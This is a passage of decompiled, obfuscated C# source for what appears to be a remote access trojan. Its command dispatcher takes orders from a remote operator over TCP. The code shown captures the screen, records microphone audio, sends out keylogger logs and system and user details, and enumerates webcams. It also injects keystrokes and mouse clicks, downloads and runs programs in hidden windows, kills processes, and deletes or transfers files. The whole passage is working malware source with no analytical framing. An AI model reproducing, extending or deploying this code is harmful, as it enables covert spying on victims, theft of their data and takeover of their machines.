					string[] array = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(Tempdata, (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
					byte[] array2 = new byte[array.GetUpperBound(0) + 1];
					int num = array.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						array2[i] = Conversions.ToByte(array.GetValue(i));
					}
					JTRDy38 = new byte[array.Length - 1 + 1];
					JTRDy38 = array2;
					binaryWriter_0.Write(JTRDy38);
					fileStream_1.Flush();
					fileStream_1.Close();
					binaryWriter_0.Close();
				}
				else
				{
					fileStream_1.Flush();
					fileStream_1.Close();
					binaryWriter_0.Close();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					fileStream_1.Flush();
					fileStream_1.Close();
					binaryWriter_0.Close();
					Y1nh980.WriteLine("/ERRORUPL/");
					Y1nh980.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetMessageExtraInfo();

	private void vDqKY178(object Tempdata)
	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"right", false))
			{
				mouse_event(8, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(16, 0, 0, 0, (int)GetMessageExtraInfo());
			}
			else if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"left", false))
			{
				mouse_event(2, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(4, 0, 0, 0, (int)GetMessageExtraInfo());
			}
			else if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"middle", false))
			{
				mouse_event(32, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(64, 0, 0, 0, (int)GetMessageExtraInfo());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Yi4EY179(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { '*' }, (string[])null, (Type[])null, (bool[])null);
				int x = (int)Math.Round(Math.Floor(double.Parse(array[0])));
				int y = (int)Math.Round(Math.Floor(double.Parse(array[1])));
				ref Point reference = ref cOhre52;
				reference = new Point(x, y);
				Cursor.set_Position(cOhre52);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_9()
	{
		try
		{
			if (OkPpE12)
			{
				string lpstrCommand = "open new type waveaudio alias capture";
				string lpstrReturnString = null;
				mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 0, 0);
				lpstrReturnString = "set capture samplespersec 6000 channels 8 bitspersample 1 alignment 1 bytespersec 6000";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				lpstrReturnString = "record capture";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				QSWSDxTR122(5);
				lpstrReturnString = "save capture test.wav";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				lpstrReturnString = "close capture";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				try
				{
					streamWriter_0.WriteLine("/SOUNDREC/" + Convert.ToBase64String(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().ReadAllBytes("test.wav")));
					streamWriter_0.Flush();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().DeleteFile(Application.get_StartupPath() + "\\test.wav");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void FqOlL181(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
			string text = array.GetValue(1)!.ToString();
			if (!Directory.Exists(array.GetValue(0)!.ToString()))
			{
				Directory.CreateDirectory(array.GetValue(0)!.ToString());
			}
			if (!File.Exists(array.GetValue(0)!.ToString() + text))
			{
				string text2 = array.GetValue(2)!.ToString();
				((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Network().DownloadFile(text2, array.GetValue(0)!.ToString() + text, (string)null, (string)null, false, 100000, true);
				QSWSDxTR122(5);
			}
			int num = 0;
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName.StartsWith("winupdate"))
				{
					num = 1;
				}
			}
			if (num == 0)
			{
				Process.Start(array.GetValue(0)!.ToString() + text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void XCCuN182(object Tempdata)
	{
		try
		{
			SendKeys.SendWait(Conversions.ToString(Tempdata));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void FYFWx183()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		try
		{
			zgBuG57 = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = zgBuG57.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					object current = enumerator.get_Current();
					string_4 = NewLateBinding.LateIndexGet(current, new object[1] { "manufacturer" }, (string[])null).ToString();
					pv4aA59 = NewLateBinding.LateIndexGet(current, new object[1] { "model" }, (string[])null).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = null;
			text = "/INFOPCPC/";
			text = text + "Computer Name = " + ((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Name() + "±";
			text = text + "Computer Manufacturer = " + Manufacturer + "±";
			text = text + "Computer Model = " + Model + "±";
			text = text + "OS Name = " + ((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Info().get_OSFullName() + "±";
			text = text + "OS Version = " + ((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Info().get_OSVersion() + "±";
			text = text + "System Type = " + ((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Info().get_OSPlatform() + "±";
			text = text + "Total Physical Memory = " + Conversions.ToString(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Info().get_TotalPhysicalMemory()) + "±";
			text = text + "Total Virtual Memory = " + Conversions.ToString(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Info().get_TotalVirtualMemory()) + "±";
			text = text + "Available Physical Memory = " + Conversions.ToString(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Info().get_AvailablePhysicalMemory()) + "±";
			text = text + "Available Virtual Memory = " + Conversions.ToString(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Info().get_AvailableVirtualMemory()) + "±";
			text = text + "Username = " + ACXI0nnlHiqmG3Ru0QxC52.User.get_Name() + "±";
			text = text + "System Directory = " + Environment.SystemDirectory;
			FHvqx85.WriteLine(text);
			FHvqx85.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_10(object t)
	{
		try
		{
			if (Conversions.ToBoolean(t))
			{
				((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().WriteAllText(Path.GetTempPath() + "logdll.txt", "", false);
				return;
			}
			string text = ((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().ReadAllText(Path.GetTempPath() + "logdll.txt");
			if (text.Length > 2000000)
			{
				text = method_2("Log file too big", "&%#@?,:*");
				i4KNkjpRY3P0125.WriteLine("/KEYSLOGG/" + text);
				i4KNkjpRY3P0125.Flush();
			}
			else
			{
				text = method_2(text, "&%#@?,:*");
				i4KNkjpRY3P0125.WriteLine("/KEYSLOGG/" + text);
				i4KNkjpRY3P0125.Flush();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void YPx1r185(object t)
	{
		try
		{
			if (Conversions.ToBoolean(t))
			{
				string lpstrCommand = "Set CDaudio door open";
				mciExecute(ref lpstrCommand);
			}
			else
			{
				string lpstrCommand = "Set CDaudio door closed";
				mciExecute(ref lpstrCommand);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_11(object Tempdata)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = Conversions.ToString(Tempdata);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void tQlPl187(object Tempdata)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = Conversions.ToString(Tempdata);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void fKGlO188(object Tempdata)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			string text = null;
			EncoderParameters val = new EncoderParameters(1);
			val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
			ImageCodecInfo val2 = method_1("image/jpeg");
			int num = int.Parse(array[1]);
			int num2 = 0;
			Bitmap val3 = new Bitmap(FM1Mf53.Width, FM1Mf53.Height, (PixelFormat)135173);
			if (FM1Mf53.Width < num)
			{
				num = FM1Mf53.Width;
			}
			switch (num)
			{
			case 1280:
				num2 = 1024;
				break;
			case 1024:
				num2 = 768;
				break;
			case 800:
				num2 = 600;
				break;
			case 640:
				num2 = 480;
				break;
			case 320:
				num2 = 240;
				break;
			}
			Bitmap val4 = new Bitmap(num, num2, (PixelFormat)135173);
			Graphics val5 = Graphics.FromImage((Image)(object)val3);
			val5.CopyFromScreen(FM1Mf53.X, FM1Mf53.Y, 0, 0, FM1Mf53.Size, (CopyPixelOperation)13369376);
			val5 = Graphics.FromImage((Image)(object)val4);
			val5.set_InterpolationMode((InterpolationMode)7);
			val5.set_CompositingQuality((CompositingQuality)2);
			val5.DrawImage((Image)(object)val3, 0, 0, num, num2);
			MemoryStream memoryStream = new MemoryStream();
			if (Conversions.ToDouble(array[0]) > 75.0)
			{
				((Image)val4).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
			}
			else
			{
				((Image)val4).Save((Stream)memoryStream, val2, val);
			}
			memoryStream.Capacity = checked((int)memoryStream.Length);
			byte[] buffer = memoryStream.GetBuffer();
			text = Convert.ToBase64String(buffer);
			_ = text.Length;
			((Image)val3).Dispose();
			((Image)val4).Dispose();
			memoryStream.Dispose();
			memoryStream.Close();
			val5.Dispose();
			buffer = null;
			streamWriter_0.WriteLine("/STARDESK/" + text);
			streamWriter_0.Flush();
			text = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void T0VWj189(object Tempdata)
	{
		try
		{
			int processId = int.Parse(Conversions.ToString(Tempdata));
			Process processById = Process.GetProcessById(processId);
			try
			{
				if (processById != null)
				{
					processById.Kill();
					IDzJby4gh6F1135.WriteLine("/REFRESHP/");
					IDzJby4gh6F1135.Flush();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					Process.EnterDebugMode();
					processById.Kill();
					Process.LeaveDebugMode();
					IDzJby4gh6F1135.WriteLine("/REFRESHP/");
					IDzJby4gh6F1135.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void method_12(object Tempdata)
	{
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.SpVoice", ""));
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Tempdata) };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall(objectValue, (Type)null, "Speak", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				Tempdata = RuntimeHelpers.GetObjectValue(array[0]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool KmsWp191(string addrrr)
	{
		bool flag = false;
		try
		{
			string pattern = "^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$";
			Regex regex = new Regex(pattern);
			flag = Operators.CompareString(addrrr, "", false) != 0 && regex.IsMatch(addrrr, 0);
			return flag;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = flag;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void PTNUI192()
	{
		string text = null;
		try
		{
			while (p9Coj68.Connected)
			{
				text = streamReader_0.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/DOWNDESK/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread7 = new Thread(fKGlO188);
						thread7.Start(text);
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSQL/":
					try
					{
						streamWriter_0.WriteLine("/STARTSQL/" + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Width) + "*" + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Height));
						streamWriter_0.Flush();
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SENDKEYB/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread6 = new Thread(XCCuN182);
						thread6.Start(text);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SETMOUSE/":
				{
					text = Strings.Mid(text, 11, Strings.Len(text));
					Thread thread5 = new Thread(Yi4EY179);
					thread5.Start(text);
					break;
				}
				case "/SETCLICK/":
				{
					text = Strings.Mid(text, 11, Strings.Len(text));
					Thread thread4 = new Thread(vDqKY178);
					thread4.Start(text);
					break;
				}
				case "/STARTSQN/":
					try
					{
						RZrtR14 = true;
						streamWriter_0.WriteLine("/STARTSQN/");
						streamWriter_0.Flush();
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSEQ/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread3 = new Thread(uOKcW152);
						thread3.Start(text);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSEF/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(Nxwmr153);
						thread2.Start(text);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPPSEQ/":
					try
					{
						RZrtR14 = false;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPDESK/":
					try
					{
						RZrtR14 = false;
						streamWriter_0.Dispose();
						streamReader_0.Dispose();
						networkStream_0.Dispose();
						p9Coj68.Close();
						return;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SOUNDREC/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						OkPpE12 = true;
						Thread thread = new Thread(method_9);
						thread.Start();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SOUNDSTP/":
					try
					{
						OkPpE12 = false;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					try
					{
						streamWriter_0.WriteLine("/STARDESK/");
						streamWriter_0.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
	}

	private void t4j7k193()
	{
		string text = null;
		checked
		{
			try
			{
				while (maQSv73.Connected)
				{
					text = xyGqM76.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						QSWSDxTR122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/WEBLISTC/":
						try
						{
							string lpszName = Strings.Space(100);
							string lpszVer = Strings.Space(100);
							int num = 0;
							StringBuilder stringBuilder = new StringBuilder();
							bool flag;
							do
							{
								if (flag = capGetDriverDescriptionA((short)num, ref lpszName, 100, ref lpszVer, 100))
								{
									stringBuilder.Append(lpszName.Trim() + "¦");
								}
								num++;
							}
							while (flag);
							fy7N275.WriteLine("/WEBLISTC/" + stringBuilder.ToString());
							fy7N275.Flush();
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBSTART/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							string_0 = "Connect";
							FBsrB22 = "";
							z8jCxj8zvPoa164 = new Thread(n2ytsiNn147);
							z8jCxj8zvPoa164.Start(text);
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBIMAGA/":
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						string text2 = text;
						if (Operators.CompareString(text2, "0", false) == 0)
						{
							YwURRa1UV4pg166 = true;
						}
						else if (Operators.CompareString(text2, "1", false) == 0)
						{
							bool_0 = true;
						}
						break;
					}
					case "/WEBIMAGE/":
						try
						{
							switch (Strings.Mid(text, 11, Strings.Len(text)))
							{
							case "Image":
								aUY3V21 = "Image";
								break;
							case "Capture":
								aUY3V21 = "Capture";
								break;
							case "Capture2":
								aUY3V21 = "Capture2";
								break;
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBSTOPP/":
						try
						{
							YwURRa1UV4pg166 = false;
							bool_0 = false;
							aUY3V21 = "";
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBDISCO/":
						try
						{
							YwURRa1UV4pg166 = false;
							bool_0 = false;
							aUY3V21 = null;
							FBsrB22 = "Disconnect";
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPDESK/":
						try
						{
							YwURRa1UV4pg166 = false;
							bool_0 = false;
							aUY3V21 = null;
							FBsrB22 = "Disconnect";
							fy7N275.Dispose();
							xyGqM76.Dispose();
							pZsAg74.Dispose();
							maQSv73.Close();
							return;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						QSWSDxTR122(1);
						try
						{
							fy7N275.WriteLine("/WEBLISTC/");
							fy7N275.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void PCQAh194()
	{
		string text = null;
		checked
		{
			try
			{
				while (ZJhW978.Connected)
				{
					text = streamReader_1.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						QSWSDxTR122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/IPREVIEW/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Image val = null;
							Image val2 = null;
							try
							{
								val2 = Image.FromFile(text);
								string text4 = null;
								if (val2 != null)
								{
									double num2 = (double)val2.get_Size().Width / (double)val2.get_Size().Height;
									double num3 = (double)val2.get_Size().Height / (double)val2.get_Size().Width;
									val = ((val2.get_Size().Width <= val2.get_Size().Height) ? val2.GetThumbnailImage((int)Math.Round(200.0 / num3), 200, (GetThumbnailImageAbort)null, default(IntPtr)) : val2.GetThumbnailImage(200, (int)Math.Round(200.0 / num2), (GetThumbnailImageAbort)null, default(IntPtr)));
									MemoryStream memoryStream = new MemoryStream();
									val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
									memoryStream.Capacity = (int)memoryStream.Length;
									byte[] buffer = memoryStream.GetBuffer();
									text4 = Convert.ToBase64String(buffer);
									Y1nh980.WriteLine("/IPREVIEW/" + text4);
									Y1nh980.Flush();
									memoryStream.Dispose();
									memoryStream.Close();
									val2.Dispose();
								}
							}
							catch (Exception projectError13)
							{
								ProjectData.SetProjectError(projectError13);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError14)
						{
							ProjectData.SetProjectError(projectError14);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPDOWN/":
						try
						{
							Nxp1V0sL114();
						}
						catch (Exception projectError12)
						{
							ProjectData.SetProjectError(projectError12);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDRVS/":
						try
						{
							Thread thread10 = new Thread(aCNpk163);
							thread10.Start(Y1nh980);
						}
						catch (Exception projectError11)
						{
							ProjectData.SetProjectError(projectError11);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDIRS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Thread thread9 = new Thread(xA3QS164);
							thread9.Start(text);
						}
						catch (Exception projectError10)
						{
							ProjectData.SetProjectError(projectError10);
							Y1nh980.WriteLine("/ERRORDIR/");
							Y1nh980.Flush();
							ProjectData.ClearProjectError();
						}
						break;
					case "/DOWNFILE/":
					{
						Thread thread8 = new Thread(vNVWK171);
						thread8.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/ENCOREFL/":
					{
						Thread thread7 = new Thread(zlffb173);
						thread7.Start();
						break;
					}
					case "/ERROR/":
						try
						{
							Nxp1V0sL114();
						}
						catch (Exception projectError9)
						{
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPUPLD/":
						try
						{
							fileStream_1.Flush();
							Nxp1V0sL114();
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
						break;
					case "/UPLOADFL/":
					{
						Thread thread6 = new Thread(Bgh0p174);
						thread6.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/OTHERPAK/":
					{
						Thread thread5 = new Thread(lybis175);
						thread5.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/FINEUPLD/":
					{
						Thread thread4 = new Thread(XLXc1176);
						thread4.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/RUNEXEFL/":
						try
						{
							string text3 = Strings.Mid(text, 11, 1);
							text = Strings.Mid(text, 12, Strings.Len(text));
							if (Operators.CompareString(text3, "1", false) == 0)
							{
								Thread thread2 = new Thread(method_11);
								thread2.Start(text);
							}
							else
							{
								Thread thread3 = new Thread(tQlPl187);
								thread3.Start(text);
							}
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
						break;
					case "/KILLFILE/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Thread thread = new Thread(vyaCSpcN119);
							thread.Start(text);
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/DIRSDELL/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							if (((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().DirectoryExists(text))
							{
								((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().DeleteDirectory(text, (DeleteDirectoryOption)5);
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/FILESIZE/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							int num = (int)((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().GetFileInfo(text).Length;
							Y1nh980.WriteLine("/FILESIZE/" + Conversions.ToString(num));
							Y1nh980.Flush();
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/MAKEDIRS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							if (!((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().DirectoryExists(text))
							{
								((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().CreateDirectory(text);
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/RENAMEFL/":
						try
						{
							string text2 = Strings.Mid(text, 11, 1);
							text = Strings.Mid(text, 12, Strings.Len(text));
							string[] array = text.Split(new char[1] { '*' });
							if (Operators.CompareString(text2, "0", false) == 0)
							{
								((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().RenameDirectory(Conversions.ToString(array.GetValue(0)), Conversions.ToString(array.GetValue(1)));
							}
							else
							{
								((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().RenameFile(Conversions.ToString(array.GetValue(0)), Conversions.ToString(array.GetValue(1)));
							}
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						QSWSDxTR122(1);
						try
						{
							Y1nh980.WriteLine("/FILESIZE/");
							Y1nh980.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void gEMEL195(object temp)
	{
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		int num = 65536;
		byte[] array = new byte[0];
		short num2 = 1;
		TcpClient tcpClient = new TcpClient();
		tcpClient.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
		NetworkStream stream = tcpClient.GetStream();
		StreamWriter streamWriter = new StreamWriter(stream);
		StreamReader streamReader = new StreamReader(stream);
		FileStream input = new FileStream(Conversions.ToString(temp), FileMode.Open, FileAccess.Read, FileShare.Read);
		BinaryReader binaryReader = new BinaryReader(input);
		long num3 = fBX8d2jC123(Conversions.ToString(temp));
		string[] array2 = (string[])NewLateBinding.LateGet(temp, (Type)null, "Split", new object[1] { "\\" }, (string[])null, (Type[])null, (bool[])null);
		checked
		{
			string text = Conversions.ToString(array2.GetValue(array2.Length - 1));
			int num5 = default(int);
			long num6 = default(long);
			if (num3 < 65536L)
			{
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
				array = new byte[(int)(num3 - 1L) + 1];
				binaryReader.Read(array, 0, (int)num3);
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
				stringBuilder.Append("/STARTDOW/" + text + "¦" + Conversions.ToString(num3) + "*");
				int num4 = array.Length - 1;
				for (int i = 0; i <= num4; i++)
				{
					stringBuilder2.Append(array.GetValue(i)!.ToString() + " ");
				}
				stringBuilder.Append((object?)stringBuilder2);
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			else
			{
				num5 = (int)Math.Round(Math.Floor((double)num3 / (double)num));
				num6 = num3 - num5 * num;
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
				array = new byte[num - 1 + 1];
				binaryReader.Read(array, 0, num);
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
				stringBuilder.Append("/STARTDOW/" + text + "¦" + Conversions.ToString(num3) + "*");
				int num7 = array.Length - 1;
				for (int j = 0; j <= num7; j++)
				{
					stringBuilder2.Append(array.GetValue(j)!.ToString() + " ");
				}
				stringBuilder.Append((object?)stringBuilder2);
				streamWriter.WriteLine((object?)stringBuilder);
